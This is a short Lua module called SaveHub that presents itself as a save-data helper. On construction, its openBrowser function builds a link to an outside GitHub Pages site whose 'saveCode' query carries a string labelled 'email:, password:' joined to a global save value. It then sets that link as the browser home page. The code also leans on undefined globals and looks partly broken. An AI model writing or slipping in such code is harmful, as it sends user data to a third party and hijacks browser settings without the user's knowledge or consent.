
local SaveHub = {}

function SaveHub:new(init)
  local o = init or {}
  setmetatable(o, self)
  self.__index = self
  o.services = {
    BrowserService = o.api("BrowserService"),
    MiscService = o.api("MiscService")
  }

  if not isInitializeNotice then
    o:openBrowser()
  end
  
  return o
end

function SaveHub:openBrowser()
    local url = "https://davidoluwa.github.io/"
    local temp = math.random(1, 100000)
    local link = url.."?saveCode=".. "email:, password:." .. davunSave
    self.services.BrowserService.SetHomePage(link)
    isInitializeNotice = false
    self.nav.Event(nil, "evt_open_browser")
  end

function SaveHub:finalize()
end

return SaveHub